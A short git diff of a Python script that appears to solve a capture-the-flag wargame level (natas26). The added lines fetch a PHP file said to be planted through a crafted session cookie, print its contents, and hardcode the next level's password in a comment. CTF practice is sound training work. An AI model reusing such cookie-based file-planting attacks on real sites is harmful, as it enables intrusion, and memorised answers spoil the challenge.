@@ -94,4 +94,8 @@ requests.utils.cookiejar_from_dict(cookies_dict, session.cookies)
 
 # next, we can create the request
 # to create the php file that display the password of natas27
-response = session.get(URL)
+session.get(URL)
+# get the php password file
+response = session.get(URL + "/img/passwordofnatas27.php")
+# natas27 password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+print(f"natas27 password: {response.text}")
